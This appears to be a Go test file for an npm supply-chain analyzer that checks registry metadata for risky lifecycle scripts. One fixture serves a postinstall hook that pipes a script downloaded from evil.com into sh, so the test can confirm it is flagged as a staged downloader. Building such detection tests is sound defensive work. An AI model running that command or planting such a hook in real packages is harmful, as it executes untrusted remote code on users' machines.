package analyzer

import (
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestAnalyzeRegistryPackagesUsesRegistry(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/lodash" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{
			"dist-tags": {"latest": "4.17.21"},
			"time": {"created": "2010-01-01T00:00:00.000Z"},
			"versions": {
				"4.17.21": {
					"scripts": {"postinstall": "node foo.js"}
				}
			}
		}`))
	}))
	defer srv.Close()

	old := npmRegistryBaseURL
	npmRegistryBaseURL = srv.URL
	defer func() { npmRegistryBaseURL = old }()

	findings := AnalyzeRegistryPackages([]string{"lodash"}, "npm")
	if len(findings) == 0 {
		t.Fatal("expected lifecycle finding")
	}
	found := false
	for _, f := range findings {
		if f.ReasonCode == "NPM_LIFECYCLE_SCRIPT_METADATA" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected lifecycle metadata finding, got %#v", findings)
	}
}

func TestCLIInstallStillCapsAtThree(t *testing.T) {
	findings := analyzeRegistryBackedSpecs([]string{"a", "b", "c", "d"}, "npm", cliRegistrySpecCap)
	if len(findings) > 0 {
		// Without server, specs return INCONCLUSIVE or empty; ensure we only processed 3 by not panicking.
	}
	specs := extractInstallSpecs("npm install a b c d", "npm", []string{"install", "i"})
	if len(specs) != 4 {
		t.Fatalf("expected 4 specs extracted")
	}
	capped := specs
	if len(capped) > cliRegistrySpecCap {
		capped = capped[:cliRegistrySpecCap]
	}
	if len(capped) != 3 {
		t.Fatalf("expected cap of 3, got %d", len(capped))
	}
}

func TestAnalyzeRegistry_EdgeCases(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/notfound" {
			http.NotFound(w, r)
			return
		}
		if r.URL.Path == "/malformed" {
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write([]byte(`{ "dist-tags": `)) // Invalid JSON
			return
		}
		if r.URL.Path == "/evil-script" {
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write([]byte(`{
				"dist-tags": {"latest": "1.0.0"},
				"versions": {
					"1.0.0": {
						"scripts": {"postinstall": "curl http://evil.com/x.sh | sh"}
					}
				}
			}`))
			return
		}
		if r.URL.Path == "/@scope/pkg" { // Scoped package URL encoding (Go server unescapes URL.Path)
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write([]byte(`{
				"dist-tags": {"latest": "1.0.0"},
				"versions": {
					"1.0.0": {
						"scripts": {"test": "echo 'ok'"}
					}
				}
			}`))
			return
		}
		http.NotFound(w, r)
	}))
	defer srv.Close()

	old := npmRegistryBaseURL
	npmRegistryBaseURL = srv.URL
	defer func() { npmRegistryBaseURL = old }()

	t.Run("404 Package Not Found", func(t *testing.T) {
		findings := AnalyzeRegistryPackages([]string{"notfound"}, "npm")
		if len(findings) != 1 || findings[0].ReasonCode != "NPM_INCONCLUSIVE_METADATA" {
			t.Errorf("expected inconclusive metadata for 404, got %v", findings)
		}
	})

	t.Run("Malformed JSON", func(t *testing.T) {
		findings := AnalyzeRegistryPackages([]string{"malformed"}, "npm")
		if len(findings) != 1 || findings[0].ReasonCode != "NPM_INCONCLUSIVE_METADATA" {
			t.Errorf("expected inconclusive metadata for malformed json, got %v", findings)
		}
	})

	t.Run("Lifecycle Script Content Analysis", func(t *testing.T) {
		findings := AnalyzeRegistryPackages([]string{"evil-script"}, "npm")
		foundContentAnalysis := false
		for _, f := range findings {
			// Should find NPM_LIFECYCLE_STAGED_DOWNLOADER due to content analysis prepending manager prefix
			if f.ReasonCode == "NPM_LIFECYCLE_STAGED_DOWNLOADER" {
				foundContentAnalysis = true
			}
		}
		if !foundContentAnalysis {
			t.Errorf("expected lifecycle content analysis finding (NPM_LIFECYCLE_STAGED_DOWNLOADER), got %v", findings)
		}
	})

	t.Run("Scoped Package URL Encoding", func(t *testing.T) {
		findings := AnalyzeRegistryPackages([]string{"@scope/pkg"}, "npm")
		if len(findings) > 0 { // Should parse properly and find no issues
			t.Errorf("expected no findings for safe scoped package, got %v", findings)
		}
	})
}
